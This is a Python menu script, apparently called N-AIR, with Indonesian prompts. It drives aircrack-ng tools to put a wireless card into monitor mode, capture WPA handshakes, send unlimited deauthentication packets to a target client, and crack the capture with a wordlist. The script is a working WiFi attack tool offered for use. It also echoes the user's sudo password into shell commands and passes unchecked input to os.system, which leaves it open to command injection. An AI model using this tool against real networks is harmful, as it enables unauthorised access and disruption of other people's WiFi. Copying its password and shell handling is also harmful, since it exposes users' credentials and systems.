#!/usr/bin/env python

import os
from get_nic import getnic
from getpass import getpass

user = os.popen("whoami").read().strip().split("\n")
user = user[0]
os.system("mkdir n-air")
os.chdir("n-air")

def menu():

    while True:
        print('''\033[1;94m
 /$$   /$$          /$$$$$$  /$$$$$$ /$$$$$$$ 
| $$$ | $$         /$$__  $$|_  $$_/| $$__  $$
| $$$$| $$        | $$  \ $$  | $$  | $$  \ $$
| $$ $$ $$ /$$$$$$| $$$$$$$$  | $$  | $$$$$$$/
| $$  $$$$|______/| $$__  $$  | $$  | $$__  $$
| $$\  $$$        | $$  | $$  | $$  | $$  \ $$
| $$ \  $$        | $$  | $$ /$$$$$$| $$  | $$
|__/  \__/        |__/  |__/|______/|__/  |__/ by Nestero

N-AIR adalah pintasan sederhana untuk paket AIR
        ''')
        print("======= Menu =======")
        print(" [1] Interface")
        print(" [2] Cek Ombak")
        print(" [3] Retakan")
        print(" [0] Keluar")
        print("====================")
        m = input("n-air > ")
        os.system("clear")

        while m == "1":
            print("\n")
            print("List Interfaces : ")
            interface = getnic.interfaces()
            print("====================")
            print(*interface, sep = " |*| ")
            print("====================")
            print(" [0] Kembali")
            mi = input("interfaces > ")
            if mi == "0":
                os.system("clear")        
                menu()
            else:
                os.system("clear")
                print("Tidak ada dalam menu !")
                menu()

        while m == "2":
            print("Untuk Cek Ombak diperlukan akses root")
            p = getpass(f"Password untuk {user} : ")
            interface = getnic.interfaces()
            print(*interface, sep = " | ")
            itf = input("Pilih interface diatas : ")
            itfm = (f"{itf}mon")
            cmd = os.system(f"echo {p} | sudo -S airmon-ng start {itf}")
            cmd2 = os.system(f"echo {p} | sudo -S airodump-ng {itfm}")
            c = input("Pilih Chanel : ")
            b = input("Pilih BSSID : ")
            fd = input("Nama File Hasil Dump : ")
            cmd3 = os.system(f"konsole -e sudo airodump-ng -c {c} -b {b} -w {fd} {itfm} &")
            stn = input("Pilih Station : ")
            cmd4 = os.system(f"echo {p} | sudo -S aireplay-ng -0 0 -a {b} -c {stn} {itfm}")
            cmd5 = os.system(f"echo {p} | sudo -S airmon-ng stop {itfm}")
            
            print(" [0] Kembali")
            mck = input("cek_ombak > ")

            if mck == "0":
                os.system("clear")
                menu()
            else:
                os.system("clear")
                print("Tidak ada dalam menu !")
                menu()

        
        while m == "3":
            print(" [1] Retakan Hasil Cek Ombak ")
            print(" [2] Retakan Yang Lainnya ")
            print(" [0] Kembali")
            
            mr = input("retakan > ")
            
            if mr == "1":
                wl = input("Masukan File Wordlist : ")
                fd = os.popen("ls").read().strip().split("\n")
                fd = fd[0]
                b = input("Masukan BSSID Target : ")
                cmd = os.system(f"aircrack-ng -w {wl} -b {b} {fd} ")
            elif mr == "2":
                tf = input("Masukan File .cap di Retakan : ")
                wl = input("Masukan File Wordlist : ")
                b = input("Masukan BSSID Target : ")
                cmd = os.system(f"aircrack-ng -w {wl} -b {b} {tf} ")
            elif mr == "0":
                os.system("clear")
                menu()
            else:
                os.system("clear")
                print("Tidak ada dalam menu !")
                menu()
        
        if m == "0":
            os.chdir("..")
            os.system("rm -rf n-air")
            exit()
        else:
            os.system("clear")
            print("Tidak ada dalam menu !")
            menu()
menu()
